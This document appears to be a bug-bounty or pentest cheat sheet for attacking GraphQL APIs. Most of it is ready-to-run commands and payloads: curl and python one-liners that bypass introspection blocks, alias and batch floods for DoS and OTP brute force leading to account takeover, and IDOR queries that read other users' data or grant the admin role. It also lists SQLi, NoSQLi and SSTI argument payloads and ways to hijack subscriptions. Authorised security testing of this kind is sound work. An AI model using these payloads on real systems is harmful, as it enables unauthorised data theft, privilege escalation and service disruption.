# GraphQL Audit

GraphQL flips the threat model — the client drives queries. One endpoint, huge surface. Introspection
hands you the schema; field suggestions give ~80% back even when it's off. Fire on any `/graphql`,
`/api/graphql`, or GQL-over-HTTP endpoint.

## Quick checklist
```
[ ] Introspection enabled? ({ __schema { queryType { name } } })
[ ] If off → clairvoyance field discovery
[ ] Fingerprint engine (graphw00f) — engine dictates CVEs
[ ] Query batching (array of 100) + alias bombing (500 aliases) — rate-limit/DoS
[ ] Field suggestions on typos leak schema even with introspection off
[ ] IDOR: query another user's object by id, no ownership check
[ ] Field-level authz: me { role isAdmin internalNote rawApiKey }
[ ] SQLi/NoSQLi/SSTI via string args (search/filter/id)
[ ] Subscriptions: subscribe to another user's events
[ ] Introspection/WAF bypass: newline, __type, GET, fragment, content-type switch
```

## Introspection
```bash
curl -s -X POST https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```
Full dump: the standard `IntrospectionQuery` (queryType/mutationType/types/fields/args/enums) → `schema.json`.
Look for: user-data mutations (updateUser/changeEmail/deleteAccount), `user(id:)`/`order(id:)` queries,
fields `internalNote/adminOnly/role/isAdmin/rawPassword/apiKey`, `AdminUser`/`DebugInfo` types,
deprecated fields (often forgotten auth), subscription types.

**Bypass when `__schema` blocked:**
```
{"query":"query {\n __schema\n { queryType { name } } }"}        # newline
{"query":"{ __type(name: \"User\") { fields { name } } }"}        # __type not __schema
GET /graphql?query={__schema{queryType{name}}}                    # GET-only filter
{"query":"fragment f on __Schema { queryType { name } } { ...f }"} # fragment
Content-Type: application/graphql                                  # content-type switch
```

## Field suggestions (introspection off)
Typo a field → "Did you mean X?" leaks names. Automate: `clairvoyance -u https://t/graphql -o schema.json`
(recovers ~80% of introspection). Seed with `--input-document` to speed up.

## Batching / DoS / brute-force amplifier
```bash
# 100 queries in one POST (array batching)
python3 -c "import json;print(json.dumps([{'query':'{ __typename }'}]*100))" | curl -s -X POST https://t/graphql -H 'Content-Type: application/json' -d @-
# 500 aliases (bypasses per-query limits)
python3 -c "print('{\"query\":\"{ '+' '.join(f'q{i}: __typename' for i in range(500))+' }\"}')" | curl -s -X POST https://t/graphql -H 'Content-Type: application/json' -d @-
```
Escalate: 100 login mutations/request bypass per-IP lockout; 1000-alias OTP brute → ATO; reset-password bombing.

## IDOR + enumeration
```bash
# query another user's object
-d '{"query":"{ user(id: 2) { email phone paymentMethods { last4 } } }"}'
# privileged fields on your own object
-d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'
# privileged mutation on another user
-d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
# alias-enumerate 50 users in one request
python3 -c "import json;print(json.dumps({'query':'{ '+' '.join(f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1,51))+' }'}))"
```

## Injection via arguments
```
SQLi:   { users(search: "admin'--") { id } }   /   { users(id: "1 AND SLEEP(5)--") { email } }
NoSQLi: { login(username: {"$gt":""}, password: {"$gt":""}) { token } }
SSTI:   mutation { updateProfile(bio: "{{7*7}}") { bio } }
```

## Authz / subscription / depth
- Unauth: send sensitive queries/mutations with no token.
- Horizontal→vertical: `updateUserRole(userId: ME, role: "ADMIN")` as a normal user.
- Deprecated fields: `userProfile(id:2){ legacyToken adminFlags }` — auth often loosened.
- Subscription: `subscription { orderUpdated(userId: VICTIM) { status total } }` over `wss://` (wscat) —
  critical if payment/message/location events aren't per-user scoped.
- Depth bomb: nest a circular type (`friends { friends { … } }`) ×20, measure time → DoS.

## Fingerprint → CVE
`graphw00f` → engine. Hasura (auth bypass, remote-schema injection), Apollo (old depth issues),
Graphene (Python resolver injection), Hot Chocolate/.NET (federation SSRF), WPGraphQL (lots of IDOR).

## Chains
Introspection → admin mutation w/o auth = Critical. Batching → OTP brute → ATO = Critical. Field
suggestion → hidden field → IDOR = High. Unauth subscription → real-time PII = High. Depth bomb → DoS = Medium.

## Kill signals
404/410 consistently · generic "Unauthorized" with no suggestions · rate limit fires on query 2 · only
`__typename` reachable · Apollo federation gateway only (attack the downstream services instead).
